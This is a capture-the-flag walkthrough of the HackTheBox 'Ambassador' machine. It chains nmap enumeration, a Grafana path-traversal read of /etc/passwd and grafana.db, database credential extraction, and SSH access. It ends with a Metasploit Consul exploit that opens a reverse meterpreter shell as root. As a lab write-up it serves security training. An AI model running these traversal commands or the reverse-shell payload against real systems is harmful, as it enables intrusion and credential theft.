## Ambassador | HackTheBox

You can access machine [here](https://app.hackthebox.com/machines/photobomb)

<img src="https://user-images.githubusercontent.com/67650329/208110807-3c7e022f-c6f3-4484-9f86-ec3460080c7f.png" width="300px" align="center">


## Scanning / Enumeration

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

This is the result for the scanning with nmap tools:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ***
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| ***
3000/tcp open  ppp?    syn-ack ttl 63
| ***
3306/tcp open  mysql   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
| ***
```

Port open:

- 22 = SSH.
- 80 = HTTP.
- 3000 = ppp?.
- 3306 = mysql.

what's inside port 3000. We can go into port 3000.

<img src="https://user-images.githubusercontent.com/67650329/208112246-f9b00562-9e60-4b0e-beaa-f11ede8a5465.png" width="500px" align="center">

We can see the version of Grafana thats its v.8.2

And we can search the vulnerability of [Exploit DB Granfana v.8.2](https://www.exploit-db.com/exploits/50581)

And we got another site explain the vulnerability [Another exploit Grafana v.8.2](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/)

Download file on the exploit db. And run this code.

## Gaining Access / Exploitation

`python3 50581.py -H http://ambassador.htb:3000`

```
Read file > /etc/grafana/grafana.ini
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = m***7

# used for signing
;secret_key = S***m
```
We got the user and password we can login into sql with this user use this [Another exploit Grafana v.8.2](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/)

`curl --path-as-is http://[Target_IP]:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`

`curl --path-as-is http://[Target_IP]:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`

`ls -l grafana.db`

`sqlite3 grafana.db`

Login the sqlite use the user before we got.

```SQL
sqlite> .table
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||d***!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-15 05:16:45|0|{}|1|uKewFgM4z
```
We got the credential user and password for login into mysql.

`mysql -h ambassador.htb -u grafana -p`

```SQL
MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
MySQL [whackywidget]> SHOW TABLES;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
MySQL [whackywidget]> SELECT * FROM users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | Y***=                                    |
+-----------+------------------------------------------+
```
And we got the developer user and hash password of developer user. We can decrypt the hash use [cyberchef](https://cyberchef.org/)

<img src="https://user-images.githubusercontent.com/67650329/208114975-a7be7846-744f-4939-b1c5-95c8a8900947.png" width="500px" align="center">

After we decrypt tha password we got the original password. We can use for ssh.

## Maintaining Access / Post Exploitation

`ssh developer@10.10.11.183`

```
developer@ambassador:~$ whoami
developer
developer@ambassador:~$ pwd
/home/developer
developer@ambassador:~$ ls
asd  asdf  ex  exploit.py  snap  user.txt
developer@ambassador:~$ cat user.txt
f***2
```
We got the user and we can continue to the next level.

`cd /opt/my-app/`

`git show`
```SQL
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```
We got the token mysql. We can exploit use Metasploit.

`ssh -L 8500:0.0.0.0:8500 developer@10.10.11.183`

`sudo msfconsole -q -x "use multi/misc/consul_service_exec; set payload linux/x86/meterpreter/reverse_tcp;set rhosts 127.0.0.1; set lhost [tun0]; set acl_token bb03b43b-1d81-d62b-24b5-39540ee469b5; set lport 8801; exploit"`

```
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
rhosts => 127.0.0.1
lhost => 10.10.14.74
acl_token => bb03b43b-1d81-d62b-24b5-39540ee469b5
lport => 8801
[*] Started reverse TCP handler on 10.10.14.74:8801 
[*] Creating service 'jetHPARA'
[*] Service 'jetHPARA' successfully created.
[*] Waiting for service 'jetHPARA' script to trigger
[*] Sending stage (989032 bytes) to 10.10.11.183
[*] Meterpreter session 1 opened (10.10.14.74:8801 -> 10.10.11.183:45420) at 2022-12-15 06:08:12 -0500
[*] Removing service 'jetHPARA'
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > getuid
Server username: root
meterpreter > cat /root/root.txt
e***8
```
Thank you for reading 👋.

---
